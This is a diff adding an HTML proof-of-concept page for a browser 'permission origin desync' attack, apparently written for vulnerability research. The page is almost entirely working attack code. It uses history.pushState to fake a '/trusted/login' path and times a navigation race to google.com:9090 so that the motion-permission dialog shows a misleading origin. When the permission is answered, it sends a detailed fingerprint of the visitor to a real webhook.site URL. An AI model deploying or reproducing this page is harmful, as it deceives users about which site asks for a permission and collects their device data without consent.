@@ -1,0 +1,138 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Permission Origin Desync PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body{margin:0;font-family:-apple-system,BlinkMacSystemFont,system-ui;background:#f5f5f7;text-align:center}
+button{font-size:15px;padding:12px 16px;border-radius:12px;border:none;background:#007aff;color:#fff;margin:8px}
+#panel{display:none;max-width:420px;margin:80px auto;background:#fff;padding:24px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.2)}
+.notice{margin-top:14px;font-size:13px;color:#b00020}
+</style>
+</head>
+
+<body>
+
+<h2 style="margin-top:60px;">Permission Origin Confusion PoC</h2>
+<p>Attacker-controlled page</p>
+
+<button id="start">Start PoC</button>
+
+<div id="panel">
+  <h3>Request Motion Permission</h3>
+  <p>Observe origin shown in permission dialog</p>
+  <button onclick="reqMotion()">🧭 Enable Motion</button>
+  <p id="output">Result: -</p>
+  <div class="notice">Demo only — UI origin may not match JS origin</div>
+</div>
+
+<script>
+/* ================= CONFIG ================= */
+const WEBHOOK = 'https://webhook.site/a132a5ec-337f-46d5-958f-f8a8f9376120';
+const NAV_TARGET = 'https://google.com:9090';
+
+const panel  = document.getElementById('panel');
+const output = document.getElementById('output');
+
+/* ================= PASSIVE GET PROOF (NO RACE IMPACT) ================= */
+function sendProofGET(status){
+  let navType='na', navRedirects='na';
+  try{
+    const n = performance.getEntriesByType('navigation')[0];
+    if(n){ navType=n.type; navRedirects=n.redirectCount; }
+  }catch(e){}
+
+  const conn = navigator.connection || {};
+
+  const params = new URLSearchParams({
+    poc: 'permission-origin-desync',
+    permission: 'motion',
+    status: status,
+
+    attacker_origin: location.origin,
+    attacker_url: location.href,
+
+    doc_state: document.readyState,
+    visibility: document.visibilityState,
+    has_focus: document.hasFocus(),
+    history_len: history.length,
+
+    secure_ctx: window.isSecureContext,
+    protocol: location.protocol,
+
+    nav_target: NAV_TARGET,
+    nav_type: navType,
+    nav_redirects: navRedirects,
+
+    // ===== Environment / fingerprint (passive) =====
+    platform: navigator.platform,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen_res: screen.width + 'x' + screen.height,
+    color_depth: screen.colorDepth,
+    device_memory: navigator.deviceMemory || 'na',
+    cpu_cores: navigator.hardwareConcurrency || 'na',
+    touch_points: navigator.maxTouchPoints,
+    cookie_enabled: navigator.cookieEnabled,
+    dnt: navigator.doNotTrack || 'na',
+
+    connection_type: conn.effectiveType || 'na',
+    save_data: conn.saveData || false,
+
+    // timing
+    perf_now_ms: Math.round(performance.now()),
+    ts: Date.now(),
+
+    ua: navigator.userAgent,
+    lang: navigator.language
+  });
+
+  const img = new Image();
+  img.src =
+    WEBHOOK +
+    '?' + params.toString() +
+    '&poc_version=final' +
+    '&demo_intent=origin_confusion' +
+    '&target_tail=https://google.com:9090' +
+    '&marker=END';
+}
+
+/* ================= PERMISSION ================= */
+function reqMotion(){
+  if(typeof DeviceMotionEvent?.requestPermission === 'function'){
+    DeviceMotionEvent.requestPermission()
+      .then(res=>{
+        output.textContent = 'Motion: ' + res;
+        sendProofGET(res);
+      })
+      .catch(()=>{
+        output.textContent = 'Motion denied';
+        sendProofGET('error');
+      });
+  }else{
+    output.textContent = 'Motion API not supported';
+    sendProofGET('unsupported');
+  }
+}
+
+/* ================= ATTACK LOGIC ================= */
+/* Step 1: Fake trusted path */
+document.getElementById('start').onclick = () => {
+  history.pushState({}, '', '/trusted/login');
+  panel.style.display = 'block';
+};
+
+/* Step 2: Navigation race (TARGET DI AKHIR) */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090/#https://google.com:9090';
+      }, 80);
+    });
+  });
+});
+</script>
+
+</body>
+</html>
